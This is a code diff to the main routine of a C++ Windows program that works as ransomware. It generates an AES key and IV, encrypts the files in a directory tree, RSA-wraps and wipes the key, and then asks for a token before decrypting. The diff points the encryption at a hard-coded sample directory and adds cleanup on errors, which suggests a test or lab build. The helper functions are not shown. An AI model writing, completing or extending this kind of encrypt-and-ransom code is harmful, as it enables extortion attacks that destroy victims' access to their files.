@@ -1,5 +1,4 @@
 #include "../include/headers.h"
-#include <shlobj.h>
 
 #define OPERATION_SUCCEEDED 0
 #define OPERATION_FAILED 1
@@ -15,10 +14,16 @@ int main() {
 
 	if (!set_algorithm(hAlgorithm, BCRYPT_AES_ALGORITHM)) return OPERATION_FAILED;
 
-	std::vector<BYTE> iv(16), key(16), newKey, decrypted_key;
+	std::vector<BYTE> key(16), iv(16), newKey, decrypted_key;
+	if (!gen_rand(key)) {
+		BCryptCloseAlgorithmProvider(hAlgorithm, 0);
+		return OPERATION_FAILED;
+	}
 
-	if (!gen_rand(iv)) return OPERATION_FAILED;
-	if (!gen_rand(key)) return OPERATION_FAILED;
+	if (!gen_rand(iv)) {
+		BCryptCloseAlgorithmProvider(hAlgorithm, 0);
+		return OPERATION_FAILED;
+	}
 
 	DWORD keyObjLen = 0, dummy = 0;
 	NTSTATUS status = BCryptGetProperty(
@@ -30,12 +35,20 @@ int main() {
 		0
 	);
 	if (!BCRYPT_SUCCESS(status)) {
+		BCryptCloseAlgorithmProvider(hAlgorithm, 0);
 		return OPERATION_FAILED;
 	}
 
-	traverse_dir(1, targetDir.c_str(), hAlgorithm, iv, key, keyObjLen, true);
-	
-	if (!rsa_encrypt(key, newKey)) return OPERATION_FAILED;
+	//traverse_dir(1, targetDir.c_str(), hAlgorithm, key, keyObjLen, true);
+	if (!traverse_dir(1, L"C:\\Users\\user\\sample_dir", hAlgorithm, iv, key, keyObjLen, true)) {
+		BCryptCloseAlgorithmProvider(hAlgorithm, 0);
+		return OPERATION_FAILED;
+	}
+
+	if (!rsa_encrypt(key, newKey)) {
+		BCryptCloseAlgorithmProvider(hAlgorithm, 0);
+		return OPERATION_FAILED;
+	}
 
 	SecureZeroMemory(key.data(), key.size());
 	key.clear();
@@ -49,16 +62,18 @@ int main() {
 			continue;
 		}
 		else {
-			if (decrypted_key.size() == 9) {
+			if (decrypted_key.size() == 0) {
 				_tprintf(TEXT("invalid token\n"));
 			}
 		}
-	} while (decrypted_key.size() == 9);
+	} while (decrypted_key.size() == 0);
 
-	traverse_dir(1, targetDir.c_str(), hAlgorithm, iv, decrypted_key, keyObjLen, false);
-	
+	//traverse_dir(1, targetDir.c_str(), hAlgorithm, decrypted_key, keyObjLen, false);
+	if (!traverse_dir(1, L"C:\\Users\\user\\sample_dir", hAlgorithm, iv, decrypted_key, keyObjLen, false)) {
+		BCryptCloseAlgorithmProvider(hAlgorithm, 0);
+		return OPERATION_FAILED;
+	}
 
 	BCryptCloseAlgorithmProvider(hAlgorithm, 0);
-
-	return OPERATION_SUCCEEDED; 
+	return OPERATION_SUCCEEDED;
 }
